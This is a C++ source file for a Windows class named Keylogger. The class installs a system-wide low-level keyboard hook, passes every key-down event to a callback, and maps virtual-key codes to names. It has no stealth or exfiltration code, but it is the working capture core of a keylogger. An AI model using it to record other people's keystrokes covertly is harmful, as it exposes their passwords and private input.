#include "Keylogger.h"

/*
	Virtual-Key Codes: https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
*/

std::vector<std::string> Keylogger::vkCodesAll {
	"VK_UNASSIGNED", "VK_LBUTTON", "VK_RBUTTON", "VK_CANCEL", "VK_MBUTTON", "VK_XBUTTON1", "VK_XBUTTON2", "VK_UNDEFINED", "VK_BACK", "VK_TAB", "VK_RESERVED", "VK_RESERVED", "VK_CLEAR", "VK_RETURN", "VK_UNDEFINED", "VK_UNDEFINED", "VK_SHIFT", "VK_CONTROL", "VK_MENU", "VK_PAUSE", "VK_CAPITAL", "VK_KANA_HANGUEL_HANGUL", "VK_IME_ON", "VK_JUNJA", "VK_FINAL", "VK_HANJA_KANJI", "VK_IME_OFF", "VK_ESCAPE", "VK_CONVERT", "VK_NONCONVERT", "VK_ACCEPT", "VK_MODECHANGE", "VK_SPACE", "VK_PRIOR", "VK_NEXT", "VK_END", "VK_HOME", "VK_LEFT", "VK_UP", "VK_RIGHT", "VK_DOWN", "VK_SELECT", "VK_PRINT", "VK_EXECUTE", "VK_SNAPSHOT", "VK_INSERT", "VK_DELETE", "VK_HELP", "VK_0", "VK_1", "VK_2", "VK_3", "VK_4", "VK_5", "VK_6", "VK_7", "VK_8", "VK_9", "VK_UNDEFINED", "VK_UNDEFINED", "VK_UNDEFINED", "VK_UNDEFINED", "VK_UNDEFINED", "VK_UNDEFINED", "VK_UNDEFINED", "VK_A", "VK_B", "VK_C", "VK_D", "VK_E", "VK_F", "VK_G", "VK_H", "VK_I", "VK_J", "VK_K", "VK_L", "VK_M", "VK_N", "VK_O", "VK_P", "VK_Q", "VK_R", "VK_S", "VK_T", "VK_U", "VK_V", "VK_W", "VK_X", "VK_Y", "VK_Z", "VK_LWIN", "VK_RWIN", "VK_APPS", "VK_RESERVED", "VK_SLEEP", "VK_NUMPAD0", "VK_NUMPAD1", "VK_NUMPAD2", "VK_NUMPAD3", "VK_NUMPAD4", "VK_NUMPAD5", "VK_NUMPAD6", "VK_NUMPAD7", "VK_NUMPAD8", "VK_NUMPAD9", "VK_MULTIPLY", "VK_ADD", "VK_SEPARATOR", "VK_SUBTRACT", "VK_DECIMAL", "VK_DIVIDE", "VK_F1", "VK_F2", "VK_F3", "VK_F4", "VK_F5", "VK_F6", "VK_F7", "VK_F8", "VK_F9", "VK_F10", "VK_F11", "VK_F12", "VK_F13", "VK_F14", "VK_F15", "VK_F16", "VK_F17", "VK_F18", "VK_F19", "VK_F20", "VK_F21", "VK_F22", "VK_F23", "VK_F24", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_NUMLOCK", "VK_SCROLL", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_LSHIFT", "VK_RSHIFT", "VK_LCONTROL", "VK_RCONTROL", "VK_LMENU", "VK_RMENU", "VK_BROWSER_BACK", "VK_BROWSER_FORWARD", "VK_BROWSER_REFRESH", "VK_BROWSER_STOP", "VK_BROWSER_SEARCH", "VK_BROWSER_FAVORITES", "VK_BROWSER_HOME", "VK_VOLUME_MUTE", "VK_VOLUME_DOWN", "VK_VOLUME_UP", "VK_MEDIA_NEXT_TRACK", "VK_MEDIA_PREV_TRACK", "VK_MEDIA_STOP", "VK_MEDIA_PLAY_PAUSE", "VK_LAUNCH_MAIL", "VK_LAUNCH_MEDIA_SELECT", "VK_LAUNCH_APP1", "VK_LAUNCH_APP2", "VK_RESERVED", "VK_RESERVED", "VK_OEM_1", "VK_OEM_PLUS", "VK_OEM_COMMA", "VK_OEM_MINUS", "VK_OEM_PERIOD", "VK_OEM_2", "VK_OEM_3", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_RESERVED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_UNASSIGNED", "VK_OEM_4", "VK_OEM_5", "VK_OEM_6", "VK_OEM_7", "VK_OEM_8", "VK_RESERVED", "VK_OEM_SPECIFIC", "VK_OEM_102", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_PROCESSKEY", "VK_OEM_SPECIFIC", "VK_PACKET", "VK_UNASSIGNED", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_OEM_SPECIFIC", "VK_ATTN", "VK_CRSEL", "VK_EXSEL", "VK_EREOF", "VK_PLAY", "VK_ZOOM", "VK_NONAME", "VK_PA1", "VK_OEM_CLEAR", "VK_UNASSIGNED"
};

HHOOK Keylogger::hookKeyboard = nullptr;
MSG Keylogger::msg { 0 };
std::function<void(PKBDLLHOOKSTRUCT)> Keylogger::callback;

HHOOK__* hookKeyboardAddress = nullptr;
std::function<void(PKBDLLHOOKSTRUCT)>* callbackAddress = nullptr;
LRESULT ProcKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;

	if(wParam == WM_KEYDOWN && nCode == HC_ACTION) {
		(*callbackAddress)(key);
	}

	return CallNextHookEx(hookKeyboardAddress, nCode, wParam, lParam);
}

Keylogger::Keylogger() {
	if(!hookKeyboard) {
		hookKeyboard = SetWindowsHookExA(WH_KEYBOARD_LL, ProcKeyboard, 0, 0);

		hookKeyboardAddress = hookKeyboard;
	}
}

void Keylogger::SetCallback(std::function<void(PKBDLLHOOKSTRUCT)>& callback) {
	this->callback = callback;
	callbackAddress = &callback;
}

Keylogger::Keylogger(std::function<void(PKBDLLHOOKSTRUCT)>& callback): Keylogger() {
	SetCallback(callback);
}

Keylogger::~Keylogger() {
	if(hookKeyboard) {
		UnhookWindowsHookEx(hookKeyboard);
	}
}